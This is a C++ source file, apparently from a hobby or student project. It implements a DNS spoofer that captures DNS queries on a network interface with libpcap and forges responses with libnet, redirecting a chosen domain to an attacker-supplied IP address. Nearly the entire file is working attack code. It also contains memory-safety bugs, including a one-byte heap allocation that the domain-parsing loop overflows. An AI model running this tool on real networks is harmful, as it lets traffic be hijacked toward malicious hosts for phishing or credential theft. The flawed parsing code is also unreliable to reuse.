#include <netinet/in.h>
#include <linux/if_ether.h>
#include <iostream>
#include <udns.h>
#include <libnet.h>
#include "DnsSpoofer.h"

#include <algorithm>

using std::for_each;
using std::string;

DnsSpoofer::DnsSpoofer() = default;
vector<std::string> spoof_domain_segments;
char spoof_domain_name[1024];
uint8_t* ip;


void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes);
vector<string> get_domain_name(const unsigned char *query_payload);

void DnsSpoofer::start_spoofing(char *device, const vector<std::string> &inputDomain, uint8_t *inputIp) {
    spoof_domain_segments = inputDomain;
    ip = inputIp;

    for(auto & segment : inputDomain) {
        char tmp[1024] = "";
        snprintf(tmp, sizeof tmp, "%c%s", (char)strlen(segment.c_str()), segment.c_str());
        sprintf(spoof_domain_name, "%s%s", spoof_domain_name, tmp);
    }

    struct bpf_program fp{};
    bpf_u_int32 netp, maskp;
    _errbuf = (char*)malloc(PCAP_ERRBUF_SIZE);
    pcap_t *pcap = pcap_create(device, _errbuf);
    pcap_set_snaplen(pcap, 65535);
    pcap_setdirection(pcap, PCAP_D_IN);
    pcap_activate(pcap);
    pcap_lookupnet(device, &netp, &maskp, _errbuf);
    int i = pcap_compile(pcap, &fp, FILTER_DNS, 0, netp);
    if(i == -1) {
        pcap_perror(pcap, _errbuf);
        cout << _errbuf << endl;
    }
    if (pcap_setfilter(pcap, &fp) < 0) {
        cout << "ap_setfilter()" << endl;
        exit(EXIT_FAILURE);
    }
    pcap_loop(pcap, -1, handle_dns_packet, nullptr);
}

vector<string> get_domain_name(const unsigned char *query_payload) {
    vector<string> domain_name;
    for(int i = 0; ; ) {
        int current_length = query_payload[i++];
        if(current_length == 0) {
            break;
        }
        else {
            auto domain_segment = new unsigned char(current_length + 1);
            domain_segment[current_length] = '\0';
            for(int j = 0; j < current_length; j++) {
                domain_segment[j] = query_payload[i++];
            }
            domain_name.emplace_back(reinterpret_cast<char*>(domain_segment));
        }
    }
    return domain_name;
}

void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {

    vector<string> spoof_target = spoof_domain_segments;

    auto incoming_ethernet_header = (struct ethhdr *) bytes;
    auto incoming_ip_header = (struct iphdr*)(bytes + sizeof(struct ethhdr));
    auto incoming_udp_header = (struct libnet_udp_hdr*)(bytes + sizeof(struct ethhdr)+ sizeof(struct iphdr));
    auto incoming_dns_header = (unsigned char *)(bytes + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct libnet_udp_hdr));

//    printf("========= DNS =========\n");
//    printf("Transaction ID: 0x%04x\n", dns_qid(incoming_dns_header));
//    printf("Questions: %i\n", dns_numqd(incoming_dns_header));
//    printf("Answer RRs: %i\n", dns_numan(incoming_dns_header));
//    printf("Authority RRs: %i\n", dns_numns(incoming_dns_header));
//    printf("Additional RRs: %i\n", dns_numar(incoming_dns_header));
//    printf("response/request 0x%02x\n", dns_qr(incoming_dns_header));


    cout << (dns_qr(incoming_dns_header ) > 0 ? "[RES]" : "[REQ]") << " id: 0x"<< std::hex << dns_qid(incoming_dns_header ) << ", query: ";
    auto domain_name_segments = get_domain_name(dns_payload(incoming_dns_header ));
    for(auto & segment: domain_name_segments) {
        cout << segment << ".";
    }
    cout <<  endl;

    if(dns_qr(incoming_dns_header ) == 0) { // when dns request

        if(domain_name_segments.size() == spoof_target.size()) {
            auto spoof = true;
            for(int i = 0; i < domain_name_segments.size(); i++) {
                if(domain_name_segments[i] != spoof_target[i]) {
                    spoof = false;
                    break;
                }
            }

            if(spoof) {
                cout << "Spoofing!" << endl;
                char err_buf[LIBNET_ERRBUF_SIZE];
                auto libnet_context = libnet_init(LIBNET_LINK, nullptr, err_buf);

                //TODO: xD way there, just for tests

                char payload[1024];
                auto payload_s = snprintf(
                        payload,
                        sizeof payload,
                        "%s%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",
                        spoof_domain_name,
                        0x00,
                        0x00, 0x01, // A
                        0x00, 0x01, // IN
                        //answer
                        0xc0, 0x0c, //idk
                        0x00, 0x01, // A
                        0x00, 0x01, // IN
                        0x00, 0x00, 0x00, 0x11, // 17 time to live: );
                        0x00, 0x04, //data length 4
                        ip[0], ip[1], ip[2], ip[3] // yafud.pl
                );

                cout << "PayloadS" << payload_s << endl;

                auto tag = libnet_build_dnsv4(
                        LIBNET_UDP_DNSV4_H, //const size of dns header - 12
                        (uint16_t)dns_qid(incoming_dns_header ), // transaction id
                        (uint16_t)(0 | (1 << 15)), // flags (set only first -> first indicate response)
                        1 /*dns_numqd(dns)*/, // question number
                        1 /*dns_numan(dns)*/, // answer RR number
                        0, // auth RR number
                        0, // additional RR number
                        (const uint8_t*)payload, // payload
                        (uint32_t)payload_s, // payload size
                        libnet_context,
                        0 // tag, 0 -> to create new header
                );
                if(tag == -1) {
                    cout << "dns error: " << libnet_geterror(libnet_context) << endl;
                }

                cout << (uint32_t)incoming_udp_header->uh_dport << endl;
                cout << (uint32_t)incoming_udp_header->uh_sport << endl;

                tag = libnet_build_udp(
                        ntohs(incoming_udp_header->uh_dport), // destination port
                        ntohs(incoming_udp_header->uh_sport), // source port 53
                        (uint16_t)(LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s), // length
                        0, // checksum
                        nullptr, // payload,
                        0, // payload size
                        libnet_context,
                        0 // tag, 0 -> to create new header
                );
                if(tag == -1) {
                    cout << "udp error: " << libnet_geterror(libnet_context) << endl;
                }

                cout << incoming_ip_header->daddr << endl; //192.168.0.11
                cout << incoming_ip_header->saddr << endl; //62.21.99.94

                tag = libnet_build_ipv4 (
                        (uint16_t)(LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s),	// length
                        (uint8_t)incoming_ip_header->tos, // tos NIE WIEM XD
                        (uint16_t)incoming_ip_header->id, // id
                        0, // fragment
                        (uint8_t)incoming_ip_header->ttl, // time to live
                        IPPROTO_UDP, // upper layer protocol
                        0, // checksum
                        incoming_ip_header->daddr,		//Src IP //192.168.0.11
                        incoming_ip_header->saddr,		//Dst IP
                        nullptr, // payload
                        0, // payload size
                        libnet_context,
                        0 // package tag, 0 -> to create new header
                );
                if(tag == -1){
                    cout << "ipv4 error: " << libnet_geterror(libnet_context) << endl;
                }



                tag = libnet_autobuild_ethernet(
                        incoming_ethernet_header->h_source,
                        ETHERTYPE_IP,
                        libnet_context
                );
                if(tag == -1){
                    cout << "ethernet error: " << libnet_geterror(libnet_context) << endl;
                }


                if(libnet_write(libnet_context) == -1) {
                    printf("write error: %s\n", libnet_geterror(libnet_context));
                }

                libnet_clear_packet(libnet_context);
            }
        }


    }

    cout << "=======================" << endl << endl;
}
